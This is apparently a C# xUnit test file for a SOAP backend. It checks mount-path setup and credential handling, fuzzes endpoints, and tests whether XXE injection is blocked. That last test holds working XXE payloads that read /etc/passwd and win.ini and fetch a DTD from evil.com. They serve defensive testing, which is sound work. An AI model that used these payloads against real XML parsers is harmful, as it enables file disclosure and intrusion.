using System;
using System.Security;
using System.Threading.Tasks;
using FluentAssertions;
using FsCheck;
using FsCheck.Xunit;
using Microsoft.Extensions.Configuration;
using Moq;
using NinePSharp.Server.Backends.SOAP;
using NinePSharp.Server.Interfaces;
using NinePSharp.Fuzzer;
using Xunit;

namespace NinePSharp.Backends.Soap.Tests;

public class SoapBackendTests
{
    private readonly Mock<ILuxVaultService> _mockVault = new Mock<ILuxVaultService>();

    private IConfiguration CreateConfig(string mountPath, string? endpoint = null)
    {
        var config = new Dictionary<string, string?>
        {
            ["MountPath"] = mountPath,
            ["Endpoint"] = endpoint ?? "https://www.example.com/soap",
            ["Namespace"] = "http://example.com/soap"
        };
        return new ConfigurationBuilder().AddInMemoryCollection(config!).Build();
    }

    [Fact]
    public async Task SoapBackend_Initialize_SetsMountPath()
    {
        var backend = new SoapBackend(_mockVault.Object);
        var config = CreateConfig("/soap");

        await backend.InitializeAsync(config);

        backend.MountPath.Should().Be("/soap");
    }

    [Fact]
    public async Task SoapBackend_GetFileSystem_ReturnsFileSystem()
    {
        var backend = new SoapBackend(_mockVault.Object);
        await backend.InitializeAsync(CreateConfig("/soap"));

        var fs = backend.GetFileSystem();

        fs.Should().NotBeNull();
    }

    [Fact]
    public async Task SoapBackend_GetFileSystemWithCredentials_ReturnsFileSystem()
    {
        var backend = new SoapBackend(_mockVault.Object);
        await backend.InitializeAsync(CreateConfig("/soap"));

        var creds = new SecureString();
        foreach (char c in "user:password") creds.AppendChar(c);
        creds.MakeReadOnly();

        var fs = backend.GetFileSystem(creds);

        fs.Should().NotBeNull();
    }

    [Fact]
    public void SoapBackend_Name_IsNotEmpty()
    {
        var backend = new SoapBackend(_mockVault.Object);
        backend.Name.Should().NotBeEmpty();
    }

    [Property]
    public Property SoapBackend_MountPathPreserved()
    {
        return FsCheck.Prop.ForAll<string>(mountPath =>
        {
            if (string.IsNullOrWhiteSpace(mountPath)) return true;

            var mockVault = new Mock<ILuxVaultService>();
            var backend = new SoapBackend(mockVault.Object);
            var config = CreateConfig(mountPath);
            backend.InitializeAsync(config).Wait();

            return backend.MountPath == mountPath;
        });
    }
}

public class SoapBackendFuzzingTests
{
    private readonly Mock<ILuxVaultService> _mockVault = new Mock<ILuxVaultService>();

    [Fact]
    public void SoapBackend_FuzzEndpoints()
    {
        var backend = new SoapBackend(_mockVault.Object);
        var attackVectors = FuzzerBridge.GenerateAttackVectors();

        foreach (var vector in attackVectors)
        {
            var endpoint = System.Text.Encoding.UTF8.GetString(vector);
            var config = new ConfigurationBuilder()
                .AddInMemoryCollection(new Dictionary<string, string?>
                {
                    ["MountPath"] = "/soap",
                    ["Endpoint"] = endpoint,
                    ["Namespace"] = "http://example.com"
                }!)
                .Build();

            try
            {
                backend.InitializeAsync(config).Wait();
            }
            catch
            {
                // Expected for malformed endpoints
            }
        }
    }

    [Fact]
    public void SoapBackend_XxeAttemptsBlocked()
    {
        var backend = new SoapBackend(_mockVault.Object);
        var xxePayloads = new[]
        {
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
            "<!ENTITY xxe SYSTEM \"http://evil.com/evil.dtd\">",
            "<!ENTITY % xxe SYSTEM \"file:///c:/windows/win.ini\">"
        };

        foreach (var payload in xxePayloads)
        {
            var config = new ConfigurationBuilder()
                .AddInMemoryCollection(new Dictionary<string, string?>
                {
                    ["MountPath"] = "/soap",
                    ["Endpoint"] = "https://example.com/soap",
                    ["Namespace"] = payload
                }!)
                .Build();

            try
            {
                backend.InitializeAsync(config).Wait();
                // XXE should not execute
            }
            catch
            {
                // Expected - invalid namespace
            }
        }
    }
}
